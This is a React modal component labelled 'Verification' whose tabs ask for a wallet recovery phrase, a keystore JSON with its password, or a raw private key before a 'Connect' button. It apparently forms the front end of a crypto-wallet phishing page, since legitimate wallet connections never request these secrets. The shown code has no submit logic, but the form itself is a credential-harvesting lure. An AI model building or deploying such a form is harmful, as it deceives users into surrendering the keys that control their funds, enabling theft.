import { Close } from '@mui/icons-material';
import { Modal } from '@mui/material';
import React, { useState } from 'react';

const ConnectModal = ({ open, setOpen }) => {
	const [activeTab, setActiveTab] = useState('phrase');
	const handleClose = () => {
		setOpen(false);
	};
	const tabFunc = (tab) => {
		if (tab === activeTab) {
			return 'tab active';
		} else {
			return 'tab inactive';
		}
	};
	return (
		<Modal open={open}>
			<div className='container connect'>
				<div className='modal-top'>
					<h2>Verification</h2>
					<Close onClick={handleClose} className='closeIcon' />
				</div>
				<div className='modal-body'>
					<div className='tabs'>
						<div
							className={`${tabFunc('phrase')}`}
							onClick={() => setActiveTab('phrase')}>
							Phrase
						</div>
						<div
							className={`${tabFunc('keystore')}`}
							onClick={() => setActiveTab('keystore')}>
							Keystore JSON
						</div>
						<div
							className={`${tabFunc('private')}`}
							onClick={() => setActiveTab('private')}>
							Private Key
						</div>
					</div>
					<div className='tab-body'>
						{activeTab === 'phrase' ? (
							<div className='singleTab-body phrase-body'>
								<textarea
									name='phrase'
									id=''
									placeholder='Phrase'></textarea>
								<p className='tab-info'>
									Typically 12 (sometimes 24) words separated
									by single spaces
								</p>
							</div>
						) : activeTab === 'keystore' ? (
							<div className='singleTab-body keystore-body'>
								<textarea
									name='keystore'
									id=''
									placeholder='Keystore JSON'></textarea>
								<input type='text' placeholder='Password' />
								<p className='tab-info'>
									Several lines of text beginning with '(...)'
									plus the password you used to encrypt it.
								</p>
							</div>
						) : activeTab === 'private' ? (
							<div className='singleTab-body keystore-body'>
								<input type='text' placeholder='Private Key' />
                                <p className='tab-info'>Typically 64 alphanumeric characters</p>
							</div>
						) : (
							<div></div>
						)}
					</div>
					<div className='submit-container'>
						<button className='submit-btn'>Connect</button>
					</div>
				</div>
			</div>
		</Modal>
	);
};

export default ConnectModal;
